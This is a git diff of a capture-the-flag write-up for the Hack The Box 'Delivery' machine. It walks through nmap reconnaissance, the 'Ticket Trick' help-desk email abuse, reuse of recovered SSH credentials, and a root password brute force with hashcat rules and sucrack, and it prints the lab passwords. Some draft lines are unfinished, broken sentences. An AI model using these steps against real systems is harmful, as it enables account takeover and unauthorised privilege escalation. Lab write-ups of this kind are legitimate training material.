@@ -18,15 +18,13 @@ We start by performing an nmap scan by executing `nmap -sS -sC -sV -p- 10.10.10.
 
 ![nmap](/assets/{{ imgDir }}/nmap.png)
 
-We start by investigating the web application on port 80 and 8065 by navigating to the URLs [http://10.10.10.222](http://10.10.10.222) and [http://10.10.10.222:8065](http://10.10.10.222:8065) in a browser. This results in the two landing pages shown below. For the web application on port 80, the most interesting things are the "Helpdesk" link (underlined in the image) and the "Contact Us" button. For the other web application, we can see that we are allowed to create user accounts.
+We start by investigating the web application on port 80 and 8065 by navigating to the URLs [http://10.10.10.222](http://10.10.10.222) and [http://10.10.10.222:8065](http://10.10.10.222:8065) in a browser. This results in the two landing pages shown below. For the web application on port 80, it is possible to notice a "Helpdesk" link (underlined in the image) and a "Contact Us" button which might lead to interesting pages. For the other web application, we are greeted with a login page. However, an interesting aspect of this login page is that it appears to allow anyone to create an account.
 
 ![port80](/assets/{{ imgDir }}/port80.png)
 
 ![port8065](/assets/{{ imgDir }}/port8065.png)
 
-If we click the "Helpdesk" link, we are informed by the browser that the website can not be found. This is because the link points to "http://helpdesk.delivery.htb" and the domain "helpdesk.delivery.htb" can't be resolved to an IP address. For us to reach this URL, we need to send a request to `10.10.10.222` where the "Host" header of the request has the value "helpdesk.delivery.htb". An easy way to ensure this is to map the domain "helpdesk.delivery.htb" to the IP address "10.10.10.222". As such, when we try to navigate to "Helpdesk.delivery.htb", the browser will send the request to 10.10.10.222 and ask for the host "helpdesk.delivery.htb" by placing it in header named "Host". To map the domain to the ip address, we can simply add a line to the `/etc/hosts` file, as demonstrated below. Note that the `-n` flag of the `echo` command is used to avoid trailing newlines. The `\t` and `\n` characters represent a tab and a newline character respectively. The tee command is simply used to write the output of `echo -n '10.10.10.222\thelpdesk.delivery.htb'` to the `/etc/hosts` file.
-
-we also add "delivery.htb" since this appears to be the main domain name of the target.
+If we click the "Helpdesk" link, we are informed by the browser that the website can not be found. This is because the link points to "http://helpdesk.delivery.htb" and the domain "helpdesk.delivery.htb" can't be resolved to an IP address. For us to reach this URL, we need to send a request to `10.10.10.222` where the "Host" header of the request has the value "helpdesk.delivery.htb". An easy way to ensure that this is performed automatically when navigating to "http://helpdesk.delivery.htb", is to map the domain "helpdesk.delivery.htb" to the IP address "10.10.10.222". 
 
 {% highlight none linenos %}
 ┌──(kali㉿kali)-[/tmp/x]
@@ -42,7 +40,7 @@ we also add "delivery.htb" since this appears to be the main domain name of the 
 └─$
 {% endhighlight %}
 
-If we retry to navigate to the help desk URL, we see the page below.
+To map the domain to the ip address, we can simply add the line `10.10.10.222   helpdesk.delivery.htb` to the `/etc/hosts` file. Since the domain is actually a subdomain of "delivery.htb", we might want to add both of these to the file. Adding both of these domains can be performed from the command line as demonstrated below. The `-n` flag of the `echo` command is used to avoid trailing newlines. The `\t` and `\n` characters represent a tab and a newline character respectively. Finally, the `tee` command is simply used to write the output of `echo -n '10.10.10.222\thelpdesk.delivery.htb'` to the `/etc/hosts` file. If we now try to navigate to the help desk URL [http://helpdesk.delivery.htb](http://helpdesk.delivery.htb), we reach the page below.
 
 ![helpdesk](/assets/{{ imgDir }}/helpdesk.png)
 
@@ -50,11 +48,13 @@ This page includes links to create help desk tickets, to check the status of exi
 
 ![createTicket](/assets/{{ imgDir }}/createTicket.png)
 
-Next, we click the "Create Ticket" button. This results in the page below which provides us with an id and an email address. This email addressi belongs to the domain "delivery.htb" and anything emailed to it will be added to our support ticket.
+Next, we click the "Create Ticket" button. This results in the page below, that provides us with an id and an email address which correspond to our ticket. Interestingly enough, this email address belongs to the domain "delivery.htb" and anything emailed to it will be added to our support ticket. This is a relatively common feature for help desk issues in real web applications.
 
 ![ticketCreated](/assets/{{ imgDir }}/ticketCreated.png)
 
-Many different services assumes that a user with an email at a specific domain works for that domain. For example, [Slack]() assumes that someone. Since we have access to a . This concept is called Ticket Trick and was originally described [in 2017]. 
+Many different services assume that a user with an email at a specific domain works for that domain. In essence, an email at a specific domain indicates that the owner of the email is employed at the domain.  For example, [Slack]() employs this feature. Since we have access to a . This concept is called Ticket Trick and was originally described [in 2017]. 
+
+lpDesks usually allow users to email to a temporary email address provided by HelpDesks to update thestatus of an open ticket. If though the corporate domain is used for tickets, this "feature" allows non-employee users to have access to @Company.com email addresses.  Many cloud services take emailaddresses as "proof of employment" and may grant access to internal services like GitHub, Slack,Confluence, etc. Lets try to create a new Ticket.
 
 [Explain ticket trick briefly]
 
@@ -92,50 +92,79 @@ We press internal, then skip tutorial
 
 ![ssh](/assets/{{ imgDir }}/ssh.png)
 
-We get the credentials maildeliverer:Youve_G0t_Mail! . We also get to know that the root user password is some variant of "PleaseSubscribe!" and that it should be possible to generate the password using hashcats rule engine. We can try to log in with these credentials over SSH. As shown above, this works and we get a shell as the `maildeliverer` user!
+We get the credentials maildeliverer:Youve_G0t_Mail!. We also get to know that the root user password is some variant of "PleaseSubscribe!" and that it should be possible to generate the password using hashcats rule engine. We can try to log in with these credentials over SSH. As shown above, this works and we get a shell as the `maildeliverer` user!
 
 
 
 # Privilege Escalation
+We start by generating passwords based on the string 'PleaseSubscribe!' which we found earlier. This can be done using hashcat by executing `echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > passwords`. This command uses hashcats rule engine to mutate the string 'PleaseSubscribe!' into similar strings. The `-r` flag is used to specify a `.rule` file which is simply a file containing mutation rules that describe how a string should be modified. Each line corresponds to one mutation. For example, the `/usr/share/hashcat/rules/best64.rule` file contains the lines `so0`,`si1`,`se3`. These rules substitute the "o", "i" and "e" characters for "0","1" and "3" respectively. For example, the string "leetify" could be mutated into the string "l33t1fy". A great way to learn the syntax of the rules is hashcat's [official documentation for rule based attacks](https://hashcat.net/wiki/doku.php?id=rule_based_attack).
 
-We start by generating passwords based on the string 'PleaseSubscribe!' which we found earlier. This can be done using hashcat `echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > passwords`. The `-r` flag is used to specify a `.rule` file. A rule file is simply a file which contains "rules" that describe how a string should be modified. In this case, the string is "PleaseSubscribe!". 
+A tool which can guess user passwords, without requiring password hashes, is [sucrack](https://github.com/hemp3l/sucrack/). The drawback of this tool is, however, that it has to be executed locally on the target host. As the name suggests, the tool uses the `su` command, which is normally used to switch user, to brute force the password of a particular user. Like conventional cracking tools, sucrack can read a wordlist and attempt each password in that wordlist. It attempts to use each password in the wordlist until it either runs out of passwords or finds the correct password.
 
-We perform a rule-based attack. 
-
-F.e. Leetify:
-`so0`
-`si1`
-`se3`
-This substitutes the o,i and e characters for 0,1 and 3 respectively. For example, the word "leetify" would become "l33t1fy". To understand the format of rules, see https://hashcat.net/wiki/doku.php?id=rule_based_attack.
-
-A tool which can crack user passwords, without first requiring their password hashes, is [sucrack](https://github.com/hemp3l/sucrack/). However, the drawback of this tool is that it has to be executed locally on the target host. As the name suggests, the tool uses the `su` command, which is normally used to switch user, to brute force the password of a particular user. Like conventional cracking tools, sucrack can read a wordlist and attempt each password in that wordlist. It attempts to use each password in the wordlist until it either runs out of passwords or finds a password which is correct for the target user.
-
-We can download the sucrack project from its [Github repository](https://github.com/hemp3l/sucrack/), as a zip file, using `wget`. Then, we can transfer the file by starting a python web server by executing `python3 -m http.server` and downloading the zip file using `wget` on the compromised host, as demonstrated in the two code blocks below.
+We can download the sucrack project from its [Github repository](https://github.com/hemp3l/sucrack/) as a zip file, using `wget`. Then, we can transfer the file to the target host by executing `python3 -m http.server` to start a python web server and downloading the zip file using `wget` on the compromised host, as demonstrated in the two code blocks below. We can also download the `passwords` file we generated earlier using the same technique. Once we have downloaded the two files, we execute `unzip sucrack.zip` to extract the zip file. This results in the creation of a directory named "sucrack-master" which we navigate to by executing `cd sucrack-master`.
 
 {% highlight none linenos %}
-wget https://github.com/hemp3l/sucrack/archive/refs/heads/master.zip -O sucrack.zip
-python3 -m http.server 80
+┌──(kali㉿kali)-[/tmp/x]
+└─$ wget https://github.com/hemp3l/sucrack/archive/refs/heads/master.zip -O sucrack.zip
+[...]
+2021-12-01 14:20:38 (744 KB/s) - ‘sucrack.zip’ saved [164375]
+
+┌──(kali㉿kali)-[/tmp/x]
+└─$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 {% endhighlight %}
 
 {% highlight none linenos %}
-wget10.10.14.4/sucrack.zip
-unzip sucrack.zip
+maildeliverer@Delivery:~$ wget http://10.10.16.3/sucrack.zip
+[...]
+2021-12-01 08:23:12 (599 KB/s) - ‘sucrack.zip’ saved [164375/164375]
+
+maildeliverer@Delivery:~$ wget http://10.10.16.3/passwords
+[...]
+2021-12-01 08:31:00 (262 MB/s) - ‘passwords’ saved [1177/1177]
+
+maildeliverer@Delivery:~$ unzip sucrack.zip
+Archive:  sucrack.zip
+c738b9a6d78b6aa517767d7621480a3f3dfb4dd6
+   creating: sucrack-master/
+  inflating: sucrack-master/COPYING  
+  inflating: sucrack-master/ChangeLog  
+[...] 
+  inflating: sucrack-master/src/worker.h
+maildeliverer@Delivery:~$ cd sucrack-master/
+maildeliverer@Delivery:~/sucrack-master$
 {% endhighlight %}
 
-We compile the sucrack as explained in the `README.md` file of the Github repository, as shown below.
+Next, we compile sucrack by executeing `./configure` and `make` as explained in the `README.md` file of the Github repository. This results in a binary named "sucrack" being created in the `src` dirctory.
 
 {% highlight none linenos %}
-cd /dev/shm/sucrack/
-./configure
-make
+maildeliverer@Delivery:~/sucrack-master$ ./configure
+checking for a BSD-compatible install... /usr/bin/install -c
+checking whether build environment is sane... yes
+[...]
+config.status: executing depfiles commands
+
+sucrack configuration
+---------------------
+sucrack version         : 1.2.3
+target system           : LINUX
+sucrack link flags      : -pthread
+sucrack compile flags   : -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\""
+
+maildeliverer@Delivery:~/sucrack-master$ make
+make  all-recursive
+make[1]: Entering directory '/home/maildeliverer/sucrack-master'
+[...]
+make[1]: Leaving directory '/home/maildeliverer/sucrack-master'
+maildeliverer@Delivery:~/sucrack-master$
 {% endhighlight %}
-Next, we use the sucrack binary to brute force passwords for the `root` user by executing `/dev/shm/sucrack/src/sucrack -a -w 20 -s 10 -u root -rl AFLafld /dev/shm/wordlist`.
 
-![bf](/assets/{{ imgDir }}/bf.png)
+The next step is to use the sucrack binary to brute force passwords for the `root` user by executing `./src/sucrack -u root -w 20 ../passwords`. The `-u` and `-w` flags are used to specify the target user and the number of threads to use while guessing passwords. After a couple of seconds, we obtain the password "PleaseSubscribe!21".
 
-![rootShell](/assets/{{ imgDir }}/rootShell.png)
+![crack](/assets/{{ imgDir }}/crack.png)
 
-Once we have the password, we can use the `su` command to get a shell as the `root` user.
+At this point, we should have everything we need to get a `root` shell. We start by opening a new terminal and logging in as "maildeliverer" with the "Youve_G0t_Mail!" password. This ensures that we have a terminal in a clean state as sucrack can sometimes impact the behaviour of the terminal negatively. 
 
-TODO: How to know sucrack dir?
-TODO: Flags
+![root](/assets/{{ imgDir }}/root.png)
+
+Next, we execute `su root` and submit the password "PleaseSubscribe!21". As shown above, this gives us `root` privileges on the target!
